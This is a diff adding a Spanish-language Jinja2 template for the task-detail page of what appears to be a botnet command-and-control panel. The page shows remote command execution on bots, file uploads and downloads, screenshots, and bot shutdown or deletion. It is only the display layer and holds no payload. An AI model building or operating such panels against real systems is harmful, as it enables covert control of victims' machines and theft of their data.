@@ -1,0 +1,141 @@
+{% extends "layout.html" %}
+
+{%block content%}
+
+<div>
+    <h1>&#128203 TAREA {{ complete.task_id }}</h1>
+    <hr>
+    <p>En esta página se muestra la información de la tarea seleccionada.</p>
+</div>
+
+{% if complete.type != 0 %}
+
+<div class="padd-apartado">
+    <h5>Información básica</h5>
+</div>
+<table class="table">
+    <thead>
+        <tr class="row-table">
+            <th scope="col">Tipo de tarea</th>
+            <th scope="col">Estado</th>
+            <th scope="col">Fecha tarea añadida</th>
+            <th scope="col">Fecha tarea finalizada</th>
+            <th scope="col">Bot ID</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            {% if complete.type == 0 %}
+            <td class="row-table">UNKNOWN</td>
+            {% elif complete.type == 1 %}
+            <td class="row-table">CONNECTION</td>
+            {% elif complete.type == 3 %}
+            <td class="row-table">CMD</td>
+            {% elif complete.type == 4 %}
+            <td class="row-table">UPLOAD</td>
+            {% elif complete.type == 5 %}
+            <td class="row-table">DOWNLOAD</td>
+            {% elif complete.type == 6 %}
+            <td class="row-table">SCREENSHOT</td>
+            {% elif complete.type == 7 %}
+            <td class="row-table">SHUTDOWN</td>
+            {% elif complete.type == 8 %}
+            <td class="row-table">DELETE</td>
+            {% endif %}
+            {% if complete.status == 0 %}
+            <td class="row-table">MISSING</td>
+            {% elif complete.status == 1 %}
+            <td class="row-table">OK</td>
+            {% elif complete.status == 2 %}
+            <td class="row-table">ERROR</td>
+            {% elif complete.status == 3 %}
+            <td class="row-table">WAITING</td>
+            {% endif %}
+            <td class="row-table">{{ complete.date_start }}</td>
+            {% if complete.date_finish != "" %}
+                <td class="row-table">{{ complete.date_finish }}</td>
+            {% else %}
+                <td class="row-table">-</td>
+            {% endif %}
+            <td class="row-table"><a href="/bots/{{ complete.bot_id }}">{{ complete.bot_id }}</a></td>
+        </tr>
+    </tbody>
+</table>
+
+{% if complete.type == 3 %}
+<div class="padd-apartado">
+    <h5>Ejecución de código remoto</h5>
+    <hr>
+    <p>A continuación se muestra el comando insertado para su ejecución de manera remota y, en caso de haber finalizado, se mostrará también la respuesta obtenida.</p>
+    <h5>Comando insertado</h5>
+    <p>usuario@host:~$ {{ complete.command }}</p>
+    {% if complete.status != 3 %}
+        <h5>Respuesta</h5>
+        <pre>{{ complete.response }}</pre>
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+</div>
+{% elif complete.type == 4 %}
+    <h5>Subir fichero al host remoto</h5>
+    <hr>
+    <p>A continuación se muestra, si la tarea ha sido completada, un link directo al fichero subido.</p>
+    {% if complete.status != 3 %}
+        {% if complete.status == 0 %}
+            <p>El fichero no se ha podido subir al host remoto.</p>
+        {% else %}
+            Fichero subido al host remoto: <a href="/files/upload/{{ complete.response }}">{{ complete.response }}</a>
+        {% endif %}
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+{% elif complete.type == 5 %}
+    <h5>Descargar fichero del host remoto</h5>
+    <hr>
+    <p>A continuación se muestra, si la tarea ha sido completada, un link directo para descargar el fichero obtenido.</p>
+    <p>Ruta del fichero original: {{ complete.file }}</p>
+    {% if complete.status != 3 %}
+        {% if complete.status == 0 %}
+            <p>El fichero no se ha podido encontrar en el host remoto.</p>
+        {% else %}
+            Fichero descargado: <a href="/files/bots/{{ complete.bot_id }}/{{ complete.response }}">{{ complete.response }}</a>
+        {% endif %}
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+{% elif complete.type == 6 %}
+    <h5>Tomar captura de pantalla del host remoto</h5>
+    <hr>
+    <p>A continuación se muestra, si la tarea ha sido completada, la captura de pantalla obtenida del host correspondiente.</p>
+    {% if complete.status != 3 %}
+        <img class="img-fluid" src="/files/bots/{{ complete.bot_id }}/SCREENSHOT {{ complete.task_id }}.png">
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+{% elif complete.type == 7 %}
+    <h5>Apagar bot</h5>
+    <hr>
+    {% if complete.status != 3 %}
+        <p>El bot <a href="/bots/{{ complete.bot_id }}">{{ complete.bot_id }}</a> ha sido apagado remotamente a fecha {{ complete.date_finish }}.</p>
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+{% elif complete.type == 8 %}
+    <h5>Eliminar bot</h5>
+    <hr>
+    {% if complete.status != 3 %}
+        {% if complete.status == 2 %}
+            <p>Ha habido un problema al intentar eliminar el bot <a href="/bots/{{ complete.bot_id }}">{{ complete.bot_id }}</a> de manera remota.</p>
+        {% else %}
+            <p>El bot <a href="/bots/{{ complete.bot_id }}">{{ complete.bot_id }}</a> ha sido eliminado a fecha {{ complete.date_finish }}.</p>
+        {% endif %}
+    {% else %}
+        <p>La tarea aún no se ha completado.</p>
+    {% endif %}
+{% endif %}
+
+{% else %}
+<p>La tarea seleccionada no se encuentra disponible. No se ha podido ofrecer información al respecto.</p>
+{% endif %}
+
+{% endblock %}
